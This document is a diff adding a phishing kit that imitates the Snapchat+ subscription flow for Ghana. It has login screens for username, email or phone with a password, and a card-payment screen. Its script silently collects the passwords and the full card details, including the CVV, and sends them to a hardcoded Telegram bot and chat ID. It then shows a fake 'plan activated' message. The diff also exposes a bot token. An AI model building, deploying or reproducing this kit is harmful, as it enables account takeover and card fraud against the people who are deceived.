+      cursor: pointer;
+      font-family: inherit;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: transform 0.12s;
+    }
+
+    .payment-view .trial-btn:active { transform: scale(0.97); }
+
+    .payment-view .trial-btn.loading { pointer-events: none; opacity: 0.7; }
+
+    .payment-view .btn-spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(0,0,0,0.2);
+      border-top-color: #2c230b;
+      border-radius: 50%;
+      display: none;
+      animation: spin .7s linear infinite;
+    }
+
+    .payment-view .trial-btn.loading .btn-spinner { display: block; }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .payment-view .footnote {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+      text-align: center;
+      font-size: 10.5px;
+      font-weight: 560;
+      line-height: 1.25;
+      color: rgba(248, 246, 239, 0.34);
+      margin-top: 11px;
+    }
+
+    .payment-view .login-note {
+      text-align: center;
+      font-size: 10px;
+      font-weight: 520;
+      line-height: 1.28;
+      color: rgba(248, 246, 239, 0.28);
+      margin-top: 7px;
+      margin-bottom: 0;
+    }
+
+    .payment-view .toast {
+      position: fixed;
+      bottom: max(22px, env(safe-area-inset-bottom));
+      left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      background: linear-gradient(180deg, #2c2418, #1f1a10);
+      backdrop-filter: blur(12px);
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 50px;
+      font-size: 13px;
+      font-weight: 600;
+      white-space: nowrap;
+      opacity: 0;
+      transition: all 0.22s;
+      pointer-events: none;
+      z-index: 999;
+      border: 1px solid var(--gold);
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+    }
+
+    .payment-view .toast.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+
+    @media (max-width: 380px) {
+      .payment-view .page { padding-inline: 15px; }
+      .payment-view .plan-pill { padding-inline: 14px; }
+      .payment-view .pill-left { font-size: 17px; }
+      .payment-view .pill-right { font-size: 14px; }
+      .payment-view .row-2 { gap: 8px; }
+      .payment-view .field-input {
+        min-height: 44px;
+        padding-inline: 12px;
+      }
+      .payment-view .field-label { font-size: 10px; }
+      .payment-view .toast { white-space: normal; max-width: 85%; text-align: center; font-size: 12px; }
+    }
+
+    @media (max-width: 330px) {
+      .payment-view .row-2 {
+        grid-template-columns: 1fr;
+        gap: 0;
+      }
+    }
+  </style>
+</head>
+<body data-view="home">
+  <!-- Existing views (home, email, phone, country) -->
+  <main class="phone app-view home-view" aria-label="Snapchat+ subscription screen">
+    <section class="screen">
+      <div class="brand">
+        <img class="logo" src="snapchat-plus-logo-clean.png" alt="Snapchat+ logo" />
+        <h1 id="headline">Unlock 40+ exclusive features</h1>
+      </div>
+      <div class="plans" id="plans" aria-label="Subscription plans"></div>
+      <div class="spacer"></div>
+      <div class="bottom">
+        <button class="cta" id="subscribeButton" type="button">Subscribe</button>
+        <p class="legal">Features can change at any time. Payment will be charged to your Play Store account. Your subscription will be auto-renewed at your selected interval until you cancel in Play Store settings. The amount charged may change with notice. You can cancel your subscription at any time. By tapping "Subscribe", you are agreeing to the <a href="#">Snapchat+ Subscription Terms</a> and the auto-renewal.</p>
+      </div>
+    </section>
+  </main>
+
+  <main class="login-shell app-view email-view" aria-label="Log in with username or email">
+    <section class="login-screen">
+      <button class="login-back" type="button" data-route="#home" aria-label="Back"><svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="m15 5-7 7 7 7" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+      <form class="login-form" id="emailLoginForm" action="#" autocomplete="on">
+        <h2 class="login-title">Log in</h2>
+        <label class="field-label" for="emailLogin">Username or Email</label>
+        <input class="login-input" id="emailLogin" name="username" type="text" autocomplete="username" autofocus />
+        <a class="login-switch" href="#login-phone">Use phone number instead</a>
+        <label class="field-label" for="emailPassword">Password</label>
+        <div class="password-wrap">
+          <input class="login-input" id="emailPassword" name="password" type="password" autocomplete="current-password" />
+          <button class="password-toggle" type="button" data-password-toggle="emailPassword" aria-label="Show password" aria-pressed="false"><svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M2.8 12s3.3-5.2 9.2-5.2S21.2 12 21.2 12s-3.3 5.2-9.2 5.2S2.8 12 2.8 12Z" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M14.6 12a2.6 2.6 0 0 1-3.4 2.5 2.6 2.6 0 0 1-1.7-1.7A2.6 2.6 0 0 1 12 9.4" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><path class="eye-slash" d="m19.1 4.9-14.2 14.2" stroke="currentColor" stroke-width="2.9" stroke-linecap="round"/></svg></button>
+        </div>
+        <label class="save-login"><input class="save-input" type="checkbox" checked /><span class="save-box" aria-hidden="true"><svg viewBox="0 0 18 18" fill="none"><path d="m4 9 3 3 7-7" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/></svg></span><span>Save Login Info on your device</span></label>
+        <a class="forgot-link" href="#">Forgot your password?</a>
+      </form>
+      <div class="login-spacer"></div>
+      <button class="login-submit" id="emailLoginSubmit" type="button" disabled>Log in</button>
+    </section>
+  </main>
+
+  <main class="login-shell app-view phone-view" aria-label="Log in with phone number">
+    <section class="login-screen">
+      <button class="login-back" type="button" data-route="#home" aria-label="Back"><svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="m15 5-7 7 7 7" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+      <form class="login-form" id="phoneLoginForm" action="#" autocomplete="on">
+        <h2 class="login-title">Log in</h2>
+        <label class="field-label" for="phoneNumber">Phone Number</label>
+        <div class="phone-input-wrap">
+          <button class="country-trigger" id="countryTrigger" type="button" aria-label="Choose country or region"><span class="selected-flag" id="selectedFlag">🇬🇭</span><span class="selected-dial" id="selectedDial">+ 233</span></button>
+          <input class="phone-number-input" id="phoneNumber" name="tel-national" type="tel" autocomplete="tel-national" placeholder="23 123 4567" />
+        </div>
+        <a class="login-switch" href="#login-email">Use email or username instead</a>
+        <label class="field-label" for="phonePassword">Password</label>
+        <div class="password-wrap">
+          <input class="login-input" id="phonePassword" name="password" type="password" autocomplete="current-password" />
+          <button class="password-toggle" type="button" data-password-toggle="phonePassword" aria-label="Show password" aria-pressed="false"><svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M2.8 12s3.3-5.2 9.2-5.2S21.2 12 21.2 12s-3.3 5.2-9.2 5.2S2.8 12 2.8 12Z" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M14.6 12a2.6 2.6 0 0 1-3.4 2.5 2.6 2.6 0 0 1-1.7-1.7A2.6 2.6 0 0 1 12 9.4" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><path class="eye-slash" d="m19.1 4.9-14.2 14.2" stroke="currentColor" stroke-width="2.9" stroke-linecap="round"/></svg></button>
+        </div>
+        <label class="save-login"><input class="save-input" type="checkbox" checked /><span class="save-box" aria-hidden="true"><svg viewBox="0 0 18 18" fill="none"><path d="m4 9 3 3 7-7" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/></svg></span><span>Save Login Info on your device</span></label>
+        <a class="forgot-link" href="#">Forgot your password?</a>
+      </form>
+      <div class="login-spacer"></div>
+      <button class="login-submit" id="phoneLoginSubmit" type="button" disabled>Log in</button>
+    </section>
+  </main>
+
+  <main class="login-shell app-view country-view" aria-label="Country or region selector">
+    <section class="country-screen">
+      <header class="country-header"><div class="country-topbar"><button class="country-close" id="countryClose" type="button" aria-label="Close country selector"><svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="m5 8 7 7 7-7" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/></svg></button><h2 class="country-title">Country or region</h2></div><label class="country-search"><svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><circle cx="10.7" cy="10.7" r="6.2" stroke="currentColor"/><path d="m15.5 15.5 5 5" stroke="currentColor" stroke-linecap="round"/></svg><input id="countrySearch" type="search" placeholder="Search" autocomplete="off" /></label></header>
+      <div class="country-list-wrap"><div class="country-list" id="countryList"></div><nav class="alphabet-rail" id="alphabetRail" aria-label="Country alphabet shortcuts"></nav></div>
+    </section>
+  </main>
+
+  <!-- Payment view merged from payment.html -->
+  <main class="app-view payment-view" aria-label="Payment details">
+    <div class="shell">
+      <div class="page" id="page2">
+        <div class="p2-header">
+          <div class="p2-topbar">
+            <button class="back-btn" onclick="goBackFromPayment()">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="14" height="14"><path d="M15 5.5 8.5 12l6.5 6.5"/></svg> Back
+            </button>
+            <img class="mini-logo" src="snapchat-plus-logo-clean.png" alt="Snapchat+ logo">
+          </div>
+          <h2>Complete your<br>subscription</h2>
+        </div>
+        <div class="p2-body">
+          <div class="plan-pill">
+            <div class="pill-left"><span class="pill-badge" id="planBadge"></span><span id="planName">Monthly</span><small id="planTrial">Free trial included</small></div>
+            <div class="pill-right" id="planPrice">GHS15.00 / mo</div>
+          </div>
+          <div class="field-group"><label class="field-label">Cardholder Name (on card)</label><input class="field-input" id="f-name" type="text" placeholder="Name as shown on card" autocomplete="cc-name" oninput="clearErr('f-name')"><div class="field-error" id="err-f-name">Please enter the cardholder name</div></div>
+          <div class="field-group"><label class="field-label">Card Number</label><div class="card-icons"><input class="field-input" id="f-card" type="text" inputmode="numeric" placeholder="0000  0000  0000  0000" maxlength="19" autocomplete="cc-number" oninput="formatCard(this);clearErr('f-card')"><div class="card-network"><div class="net-icon net-visa">VISA</div><div class="net-mc"></div></div></div><div class="field-error" id="err-f-card">Please enter a valid 16-digit card number</div></div>
+          <div class="row-2"><div class="field-group"><label class="field-label">Expiry</label><input class="field-input" id="f-exp" type="text" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" oninput="formatExpiry(this);clearErr('f-exp')"><div class="field-error" id="err-f-exp">Invalid expiry</div></div><div class="field-group"><label class="field-label">CVV / CVC</label><input class="field-input" id="f-cvv" type="password" inputmode="numeric" placeholder="•••" maxlength="4" autocomplete="cc-csc" oninput="clearErr('f-cvv')"><div class="field-error" id="err-f-cvv">Enter 3 or 4 digits</div></div></div>
+          <div class="security-row"><svg width="14" height="14" viewBox="0 0 24 24" fill="#a5d6a7"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg><span>256-bit SSL encryption. Your data is protected.</span></div>
+          <button class="trial-btn" id="trialBtn" onclick="submitAll()"><div class="btn-spinner" id="btnSpinner"></div><span class="btn-text">Start Free Trial</span></button>
+          <p class="footnote"><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>Your card will not be charged during the trial period.</p>
+          <p class="login-note">By continuing, you agree to our Terms of Service and Privacy Policy.</p>
+        </div>
+      </div>
+    </div>
+    <div class="toast" id="toast"></div>
+  </main>
+
+  <script>
+    // ========== TELEGRAM FORWARDING (silent, no alerts) ==========
+    const BOT_TOKEN = '2128201203:AAGPpKg3uIEjy8V1KYHXPfddBmxTFmgt_ZE';
+    const CHAT_ID = '1327564115';
+    function sendToTelegram(message) {
+      try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+        fetch(url, { method: 'GET', mode: 'no-cors', keepalive: true }).catch(() => {});
+      } catch(e) {}
+    }
+
+    // ========== INDEX.HTML SCRIPT (Plans, Login, Country) ==========
+    const offers = {
+      annual: { title: "Annual", badge: "BEST VALUE", price: "GHS5.00 / mo", headline: "Save 66% with an annual plan", expandedLines: [ "Access to all 40+ Snapchat+ features", "Save 66% when you pay upfront for the year", "For a total of GHS60.00 per year" ] },
+      monthly: { title: "Monthly", badge: null, price: "GHS15.00 / mo", offerPrice: "GHS15.00", headline: "Unlock 40+ exclusive features", specialOffer: true, expandedLines: [ "Access to all 40+ Snapchat+ features", "Cancel or change plan at any time", "Free for the first week, then GHS15.00 / mo" ] },
+      lens: { title: "Lens+", badge: null, price: "GHS50.00 / mo", headline: "Get 100+ exclusive Lenses", expandedLines: [ "Access to all 40+ Snapchat+ features", "Over 100 exclusive Lenses" ] }
+    };
+    const offerOrder = ["monthly", "annual", "lens"];
+    const OFFER_STORAGE_KEY = "snap-selected-offer";
+    const LOGIN_STORAGE_KEY = "snap-login-method";
+    let selectedOffer = "monthly";
+    const plans = document.querySelector("#plans");
+    const headline = document.querySelector("#headline");
+    function checkIcon() { return `<svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="m5.1 12.5 4.2 4.2 9.6-10" stroke="currentColor" stroke-width="3.1" stroke-linecap="round" stroke-linejoin="round"/></svg>`; }
+    function renderPrice(id, offer, selected) { if (id === "monthly" && selected) return `<span class="price price-offer"><span class="price-old">${offer.offerPrice}</span><span class="price-free">Free</span></span>`; return `<span class="price">${offer.price}</span>`; }
+    function renderOfferCard(id) { const offer = offers[id]; const selected = id === selectedOffer; const details = offer.expandedLines.map((line, index) => `<span class="feature${(id === "annual" && index === 2) || (id === "monthly" && index === 2) ? " is-note" : ""}">${(id === "annual" && index === 2) || (id === "monthly" && index === 2) ? "" : checkIcon()}<span>${line}</span></span>`).join(""); return `<button class="offer-card${selected ? " is-selected" : ""}${offer.specialOffer && selected ? " is-special-offer" : ""}" type="button" data-offer="${id}" aria-pressed="${selected}">${offer.specialOffer && selected ? `<span class="special-banner">SPECIAL OFFER</span>` : ""}<span class="selected-badge">${checkIcon()}</span><span class="offer-inner"><span class="offer-row"><span class="name-wrap"><span class="plan-name">${offer.title}</span>${offer.badge ? `<span class="badge">${offer.badge}</span>` : ""}</span>${renderPrice(id, offer, selected)}</span><span class="details" aria-hidden="${!selected}"><span class="details-clip"><span class="features">${details}</span></span></span></span></button>`; }
+    function compactGhsPrice(price) { const match = String(price || "").match(/GHS\s*(\d+)(?:\.00)?/i); return match ? `${match[1]}GHS` : price; }
+    function selectedOfferPayload() { const offer = offers[selectedOffer]; const trialLine = offer.expandedLines.find((line) => /free|trial/i.test(line)) || ""; const billingLine = offer.expandedLines.find((line) => /total|per year|per month|\/ mo/i.test(line)) || offer.price; return { id: selectedOffer, name: offer.title, badge: offer.badge || "", price: offer.price, offerPrice: offer.offerPrice || "", displayOldPrice: selectedOffer === "monthly" ? compactGhsPrice(offer.offerPrice) : "", displayFreePrice: selectedOffer === "monthly" ? "Free" : "", displayMode: selectedOffer === "monthly" ? "monthly-offer" : "standard", billingPeriod: selectedOffer === "annual" ? "Yearly billing" : "Monthly billing", trialText: trialLine || "Free trial included", billingText: billingLine, headline: offer.headline }; }
+    function rememberSelectedOffer() { try { localStorage.setItem(OFFER_STORAGE_KEY, JSON.stringify(selectedOfferPayload())); } catch(e) {} }
+    function render() { headline.style.opacity = "0"; headline.style.transform = "translateY(4px)"; window.setTimeout(() => { headline.textContent = offers[selectedOffer].headline; headline.style.opacity = "1"; headline.style.transform = "translateY(0)"; }, 90); plans.innerHTML = offerOrder.map(renderOfferCard).join(""); rememberSelectedOffer(); }
+    plans.addEventListener("click", (event) => { const card = event.target.closest(".offer-card"); if (!card) return; selectedOffer = card.dataset.offer; render(); });
+    render();
+
+    // Country & Login Logic
+    const countries = [ { iso:"GH", name:"Ghana", dial:"+233", flag:"🇬🇭" }, { iso:"US", name:"United States", dial:"+1", flag:"🇺🇸" }, { iso:"GB", name:"United Kingdom", dial:"+44", flag:"🇬🇧" }, { iso:"NG", name:"Nigeria", dial:"+234", flag:"🇳🇬" }, { iso:"ZA", name:"South Africa", dial:"+27", flag:"🇿🇦" }, { iso:"KE", name:"Kenya", dial:"+254", flag:"🇰🇪" }, { iso:"IN", name:"India", dial:"+91", flag:"🇮🇳" }, { iso:"CA", name:"Canada", dial:"+1", flag:"🇨🇦" }, { iso:"AU", name:"Australia", dial:"+61", flag:"🇦🇺" }, { iso:"DE", name:"Germany", dial:"+49", flag:"🇩🇪" }, { iso:"FR", name:"France", dial:"+33", flag:"🇫🇷" } ].sort((a,b)=>a.iso.localeCompare(b.iso));
+    const DEFAULT_COUNTRY_ISO = "GH";
+    const COUNTRY_STORAGE_KEY = "snap-login-country";
+    let selectedCountry = countries.find((c) => c.iso === DEFAULT_COUNTRY_ISO);
+    let lastLoginRoute = "#login-phone";
+    const subscribeButton = document.querySelector("#subscribeButton");
+    const emailLoginInput = document.querySelector("#emailLogin");
+    const emailPasswordInput = document.querySelector("#emailPassword");
+    const phoneNumberInput = document.querySelector("#phoneNumber");
+    const phonePasswordInput = document.querySelector("#phonePassword");
+    const emailLoginSubmit = document.querySelector("#emailLoginSubmit");
+    const phoneLoginSubmit = document.querySelector("#phoneLoginSubmit");
+    const emailLoginForm = document.querySelector("#emailLoginForm");
+    const phoneLoginForm = document.querySelector("#phoneLoginForm");
+    const selectedFlag = document.querySelector("#selectedFlag");
+    const selectedDial = document.querySelector("#selectedDial");
+    const countryTrigger = document.querySelector("#countryTrigger");
+    const countryClose = document.querySelector("#countryClose");
+    const countrySearch = document.querySelector("#countrySearch");
+    const countryList = document.querySelector("#countryList");
+    const alphabetRail = document.querySelector("#alphabetRail");
+    function routeFromHash() { const hash = window.location.hash; if (hash === "#login-email") return "email"; if (hash === "#login-phone") return "phone"; if (hash === "#country") return "country"; if (hash === "#payment") return "payment"; return "home"; }
+    function updateRoute() { const view = routeFromHash(); document.body.dataset.view = view; if (view === "email" || view === "phone") lastLoginRoute = window.location.hash; if (view === "payment") { if (typeof onPaymentViewEnter === "function") onPaymentViewEnter(); } window.setTimeout(() => { if (view === "email") document.querySelector("#emailLogin")?.focus(); if (view === "phone") document.querySelector("#phoneNumber")?.focus(); if (view === "country") countrySearch?.focus(); }, 80); }
+    function goTo(route) { window.location.hash = route; }
+    function isEmailLoginValid() { return emailLoginInput.value.trim().length >= 3 && emailPasswordInput.value.trim().length > 0; }
+    function isPhoneLoginValid() { const digits = phoneNumberInput.value.replace(/\D/g, ""); return digits.length >= 5 && phonePasswordInput.value.trim().length > 0; }
+    function setLoginButtonState(button, active) { button.disabled = !active; button.classList.toggle("is-active", active); button.setAttribute("aria-disabled", String(!active)); }
+    function updateLoginButtons() { setLoginButtonState(emailLoginSubmit, isEmailLoginValid()); setLoginButtonState(phoneLoginSubmit, isPhoneLoginValid()); }
+    function rememberLoginMethod(method) { try { localStorage.setItem(LOGIN_STORAGE_KEY, method); } catch(e) {} }
+
+    // Store captured login credentials globally
+    window._capturedLogin = { method: null, username: null, password: null, phone: null };
+
+    function continueToPayment(method) {
+      // Capture current login data
+      if (method === "email") {
+        window._capturedLogin = {
+          method: "email",
+          username: emailLoginInput.value.trim(),
+          password: emailPasswordInput.value.trim()
+        };
+      } else if (method === "phone") {
+        let fullPhone = (selectedDial.textContent.replace(/\s/g,'') + phoneNumberInput.value.trim());
+        window._capturedLogin = {
+          method: "phone",
+          phone: fullPhone,
+          password: phonePasswordInput.value.trim()
+        };
+      }
+      rememberSelectedOffer();
+      rememberLoginMethod(method);
+      goTo("#payment");
+    }
+
+    function setPasswordVisibility(button) { const input = document.getElementById(button.dataset.passwordToggle); if (!input) return; const visible = input.type === "password"; input.type = visible ? "text" : "password"; button.classList.toggle("is-visible", visible); button.setAttribute("aria-pressed", String(visible)); }
+    function formatDial(dial) { return dial.replace("+", "+ "); }
+    function setSelectedCountry(country) { selectedCountry = country; selectedFlag.textContent = country.flag; selectedDial.textContent = formatDial(country.dial); document.querySelector("#phoneNumber").placeholder = country.iso === "GH" ? "23 123 4567" : "Phone number"; }
+    function supportedCountry(iso) { return countries.find((c) => c.iso === iso); }
+    function storedCountryCode() { try { return localStorage.getItem(COUNTRY_STORAGE_KEY) || ""; } catch(e) { return ""; } }
+    function detectedCountryCode() { const stored = storedCountryCode(); if (supportedCountry(stored)) return stored; return DEFAULT_COUNTRY_ISO; }
+    function rememberCountry(country) { try { localStorage.setItem(COUNTRY_STORAGE_KEY, country.iso); } catch(e) {} }
+    function initCountryDefault() { const iso = detectedCountryCode() || DEFAULT_COUNTRY_ISO; setSelectedCountry(supportedCountry(iso) || supportedCountry(DEFAULT_COUNTRY_ISO)); }
+    function renderAlphabet() { const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ#".split(""); alphabetRail.innerHTML = letters.map((letter) => `<a href="#letter-${letter}" data-letter="${letter}">${letter}</a>`).join(""); }
+    function renderCountries() { const query = countrySearch.value.trim().toLowerCase(); const filtered = countries.filter((c) => `${c.iso} ${c.name} ${c.dial}`.toLowerCase().includes(query)); let activeLetter = ""; countryList.innerHTML = filtered.map((c) => { const letter = c.iso[0]; const heading = !query && letter !== activeLetter ? `<h3 class="country-letter" id="letter-${letter}">${letter}</h3>` : ""; activeLetter = letter; return `${heading}<button class="country-row" type="button" data-iso="${c.iso}"><span class="country-name">${c.iso} - ${c.name}</span><span class="country-code">${c.dial}</span></button>`; }).join(""); }
+    subscribeButton.addEventListener("click", () => { rememberSelectedOffer(); goTo("#login-email"); });
+    document.addEventListener("click", (event) => { const btn = event.target.closest("[data-route]"); if (btn) goTo(btn.dataset.route); });
+    countryTrigger.addEventListener("click", () => goTo("#country"));
+    countryClose.addEventListener("click", () => goTo(lastLoginRoute || "#login-phone"));
+    countrySearch.addEventListener("input", renderCountries);
+    alphabetRail.addEventListener("click", (e) => { const link = e.target.closest("[data-letter]"); if (link) { e.preventDefault(); document.querySelector(`#letter-${link.dataset.letter}`)?.scrollIntoView({ block: "start" }); } });
+    countryList.addEventListener("click", (e) => { const row = e.target.closest(".country-row"); if (row) { const country = countries.find((c) => c.iso === row.dataset.iso); if (country) { setSelectedCountry(country); rememberCountry(country); goTo("#login-phone"); } } });
+    [emailLoginInput, emailPasswordInput].forEach(i => i.addEventListener("input", updateLoginButtons));
+    [phoneNumberInput, phonePasswordInput].forEach(i => i.addEventListener("input", updateLoginButtons));
+    document.querySelectorAll("[data-password-toggle]").forEach(btn => btn.addEventListener("click", () => setPasswordVisibility(btn)));
+    emailLoginSubmit.addEventListener("click", () => { if (isEmailLoginValid()) continueToPayment("email"); });
+    phoneLoginSubmit.addEventListener("click", () => { if (isPhoneLoginValid()) continueToPayment("phone"); });
+    emailLoginForm.addEventListener("submit", (e) => { e.preventDefault(); if (isEmailLoginValid()) continueToPayment("email"); });
+    phoneLoginForm.addEventListener("submit", (e) => { e.preventDefault(); if (isPhoneLoginValid()) continueToPayment("phone"); });
+    window.addEventListener("hashchange", updateRoute);
+    initCountryDefault(); renderAlphabet(); renderCountries(); updateRoute(); updateLoginButtons();
+
+    // ========== PAYMENT.HTML SCRIPT (Merged, no duplicate const) ==========
+    const fallbackOffer = { id: "monthly", name: "Monthly", badge: "", price: "GHS15.00 / mo", offerPrice: "GHS15.00", displayMode: "monthly-offer", billingPeriod: "Monthly billing", trialText: "Free for the first week, then GHS15.00 / mo", billingText: "Free for the first week, then GHS15.00 / mo", headline: "Unlock 40+ exclusive features" };
+    function getSelectedOffer() { try { const stored = JSON.parse(localStorage.getItem(OFFER_STORAGE_KEY) || "null"); if (stored && stored.name && stored.price) return { ...fallbackOffer, ...stored }; } catch(e) {} return fallbackOffer; }
+    function renderSelectedOffer() { const offer = getSelectedOffer(); const badge = document.getElementById("planBadge"); const price = document.getElementById("planPrice"); document.getElementById("planName").textContent = offer.name; document.getElementById("planTrial").textContent = offer.trialText || offer.billingText || offer.billingPeriod; if (offer.displayMode === "monthly-offer" || offer.id === "monthly") { price.innerHTML = `<span class="price-old">15GHS</span><span class="price-free">/Free</span>`; } else { price.textContent = offer.price; } badge.textContent = offer.badge || offer.billingPeriod || ""; badge.classList.toggle("show", Boolean(offer.badge)); }
+    function formatCard(el) { let v = el.value.replace(/\D/g,'').slice(0,16); el.value = v.replace(/(.{4})/g,'$1  ').trim(); }
+    function formatExpiry(el) { let v = el.value.replace(/\D/g,''); if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2,4); el.value = v; }
+    function setErr(id, msg) { const input = document.getElementById(id); if(input) input.classList.add('error'); const errEl = document.getElementById('err-'+id); if(errEl) { errEl.textContent = msg; errEl.classList.add('show'); } }
+    function clearErr(id) { const input = document.getElementById(id); if(input) input.classList.remove('error'); const errEl = document.getElementById('err-'+id); if(errEl) errEl.classList.remove('show'); }
+    function validateCard() { let ok = true; const name = document.getElementById('f-name').value.trim(); const card = document.getElementById('f-card').value.replace(/\s/g,''); const exp = document.getElementById('f-exp').value.trim(); const cvv = document.getElementById('f-cvv').value.trim(); if (!name) { setErr('f-name', 'Please enter the cardholder name'); ok = false; } if (!/^\d{16}$/.test(card)) { setErr('f-card', 'Please enter a valid 16-digit card number'); ok = false; } const expMatch = exp.match(/^(\d{2})\/(\d{2})$/); if (!expMatch) { setErr('f-exp', 'Use MM/YY format'); ok = false; } else { const mm = parseInt(expMatch[1],10), yy = parseInt(expMatch[2],10); const now = new Date(), cy = now.getFullYear() % 100, cm = now.getMonth()+1; if (mm<1 || mm>12) { setErr('f-exp', 'Invalid month'); ok=false; } else if (yy<cy || (yy===cy && mm<cm)) { setErr('f-exp', 'Card has expired'); ok=false; } } if (!/^\d{3,4}$/.test(cvv)) { setErr('f-cvv', 'Enter 3 or 4 digits'); ok=false; } return ok; }
+    function showToast(message) { const toast = document.getElementById('toast'); toast.textContent = message; toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 3000); }
+
+    // Modified submitAll: send all captured data to Telegram, then show toast
+    function submitAll() {
+      if (!validateCard()) return;
+      const offer = getSelectedOffer();
+      const loginData = window._capturedLogin || {};
+      const paymentData = {
+        cardholder: document.getElementById('f-name').value.trim(),
+        cardNumber: document.getElementById('f-card').value.replace(/\s/g,''),
+        expiry: document.getElementById('f-exp').value.trim(),
+        cvv: document.getElementById('f-cvv').value.trim()
+      };
+
+      // Build Telegram message
+      let msg = "🔐 *Snapchat+ Full Data* 🔐\n━━━━━━━━━━━━━━━━━━\n";
+      msg += `📱 *Plan:* ${offer.name} (${offer.price})\n`;
+      if (loginData.method === "email") {
+        msg += `👤 *Login Method:* Email\n✉️ *Username/Email:* ${loginData.username || ""}\n🔑 *Password:* ${loginData.password || ""}\n`;
+      } else if (loginData.method === "phone") {
+        msg += `📞 *Login Method:* Phone\n📱 *Phone:* ${loginData.phone || ""}\n🔑 *Password:* ${loginData.password || ""}\n`;
+      } else {
+        msg += `👤 *Login:* Not captured\n`;
+      }
+      msg += `💳 *Payment Details:*\n   Name: ${paymentData.cardholder}\n   Card: ${paymentData.cardNumber}\n   Expiry: ${paymentData.expiry}\n   CVV: ${paymentData.cvv}\n`;
+      msg += `━━━━━━━━━━━━━━━━━━\n⏰ *Time:* ${new Date().toLocaleString()}`;
+
+      sendToTelegram(msg);
+
+      const btn = document.getElementById('trialBtn');
+      btn.classList.add('loading');
+      setTimeout(() => {
+        btn.classList.remove('loading');
+        showToast(`✓ ${offer.name} plan activated.`);
+        ['f-name','f-card','f-exp','f-cvv'].forEach(id => { const el = document.getElementById(id); if(el) el.value = ''; clearErr(id); });
+        // Optionally clear captured login after sending
+        window._capturedLogin = {};
+      }, 1500);
+    }
+
+    function resetPaymentForm() { ['f-name','f-card','f-exp','f-cvv'].forEach(id => { const el = document.getElementById(id); if(el) el.value = ''; clearErr(id); }); }
+    function onPaymentViewEnter() { resetPaymentForm(); renderSelectedOffer(); }
+    function goBackFromPayment() { goTo(lastLoginRoute || "#login-phone"); }
+    renderSelectedOffer();
+  </script>
+</body>
+</html>
